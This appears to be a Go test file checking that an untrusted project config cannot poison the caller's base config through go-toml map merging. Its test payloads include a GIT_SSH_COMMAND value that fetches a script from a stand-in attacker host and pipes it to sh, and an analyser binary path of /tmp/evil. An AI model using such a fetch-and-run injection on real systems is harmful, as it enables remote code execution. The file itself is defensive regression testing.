package config

// project_policy_aliasing_test.go — the ALIASING half of the project-config
// trust boundary: can a project's .plumb/config.toml write into the CALLER's
// base config on its way through LoadProject?
//
// It is a file of its own because the answer does not come from the trust gate
// or from the forcing functions at all. It comes from cloneConfig copying the
// map before go-toml unmarshals into it — and because go-toml/v2 does NOT treat
// every spelling of a key alike when it unmarshals into a PRE-POPULATED map, an
// inline table REPLACES while a sub-table and a dotted key MERGE INTO the map
// already there. A test that used only the inline form cannot see this, and a
// test that inspected only the RETURNED config cannot see it either: forcing
// runs afterwards and hands back something clean while the caller's own config
// carries the payload for the rest of the process.
//
// Every map field a project can name needs a case here.

import (
	"reflect"
	"testing"
)

// TestLoadProject_GitEnvCannotPoisonBase is the ALIASING half of that boundary,
// and it exists because go-toml/v2 does NOT treat every spelling of a key alike
// when it unmarshals into a PRE-POPULATED map. Under `[git]`, an inline
// `env = { X = "y" }` REPLACES the map; the `[git.env]` sub-table and the
// `git.env.X` dotted key MERGE INTO the one already there.
//
// LoadProjectWithPolicy unmarshals into cloneConfig(base), so the map the two
// merging spellings write into is base's own unless cloneConfig copies Git.Env.
// If it does not, an untrusted project's variables land directly in the
// caller's live base config — the daemon's — and forceCapabilityFieldsToBase
// then forces merged.Git back to a base that is ALREADY poisoned, returning a
// clean-looking config while every later load in the process carries the
// payload. A test that inspected only the return value would pass throughout,
// which is why base is asserted on here.
//
// TestLoadProject_GitEnvNeedsTrust above uses the inline form — the single
// spelling that replaces rather than merges — so it cannot see this.
func TestLoadProject_GitEnvCannotPoisonBase(t *testing.T) {
	for _, tc := range []struct{ name, payload string }{
		{"inline table", "[git]\nenv = { GIT_SSH_COMMAND = \"sh -c 'curl attacker.example/x | sh'\" }\n"},
		{"sub-table", "[git.env]\nGIT_SSH_COMMAND = \"sh -c 'curl attacker.example/x | sh'\"\n"},
		{"dotted key", "git.env.GIT_SSH_COMMAND = \"sh -c 'curl attacker.example/x | sh'\"\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ws := t.TempDir()
			writeProjectConfig(t, ws, tc.payload)
			tempTrustStore(t) // a fresh store: ws is UNTRUSTED

			base := Defaults()
			base.Git.Env = map[string]string{"GOWORK": "off"}

			got, err := LoadProject(base, ws)
			if err != nil {
				t.Fatalf("LoadProject: %v", err)
			}
			if v, ok := got.Git.Env["GIT_SSH_COMMAND"]; ok {
				t.Errorf("an untrusted project set the git child environment: GIT_SSH_COMMAND=%q", v)
			}
			if v, ok := base.Git.Env["GIT_SSH_COMMAND"]; ok {
				t.Errorf("the untrusted project config wrote into the CALLER's base config: base.Git.Env[GIT_SSH_COMMAND]=%q — the trust gate is bypassed for every later load in this process", v)
			}
			if !reflect.DeepEqual(base.Git.Env, map[string]string{"GOWORK": "off"}) {
				t.Errorf("loading a project must not touch the caller's base env at all, got %v", base.Git.Env)
			}
		})
	}
}

// TestLoadProject_QualityBinCannotPoisonBase is the [quality.bin] half of the
// aliasing boundary TestLoadProject_GitEnvCannotPoisonBase describes, and it
// exists for the same reason: `[quality.bin]` is a SUB-TABLE, one of the two
// spellings go-toml/v2 MERGES INTO a pre-populated map rather than replacing.
//
// LoadProjectWithPolicy unmarshals into cloneConfig(base), so those keys land in
// base's own map unless cloneConfig copies Quality.Bin. If it does not,
// forceGlobalOnlyToBase then forces merged.Quality.Bin back to a base that is
// ALREADY poisoned — the returned config looks clean while every later load in
// the process carries the payload, and quality.LookBinary hands that path
// straight to exec on the next write to a file of that language.
//
// Asserting only the return value would pass throughout, which is why base is
// asserted on here.
func TestLoadProject_QualityBinCannotPoisonBase(t *testing.T) {
	for _, tc := range []struct{ name, payload string }{
		{"inline table", "[quality]\nbin = { ruff = \"/tmp/evil\" }\n"},
		{"sub-table", "[quality.bin]\nruff = \"/tmp/evil\"\n"},
		{"dotted key", "quality.bin.ruff = \"/tmp/evil\"\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ws := t.TempDir()
			writeProjectConfig(t, ws, tc.payload)
			tempTrustStore(t) // a fresh store: ws is UNTRUSTED

			base := Defaults()
			base.Quality.Bin = map[string]string{"golangci-lint": "/usr/bin/golangci-lint"}

			got, err := LoadProject(base, ws)
			if err != nil {
				t.Fatalf("LoadProject: %v", err)
			}
			if v, ok := got.Quality.Bin["ruff"]; ok {
				t.Errorf("a project config chose the analyser binary: ruff=%q", v)
			}
			if v, ok := base.Quality.Bin["ruff"]; ok {
				t.Errorf("the project config wrote into the CALLER's base config: base.Quality.Bin[ruff]=%q — "+
					"every later load in this process would run it", v)
			}
			if !reflect.DeepEqual(base.Quality.Bin, map[string]string{"golangci-lint": "/usr/bin/golangci-lint"}) {
				t.Errorf("loading a project must not touch the caller's base bin map at all, got %v", base.Quality.Bin)
			}
		})
	}
}
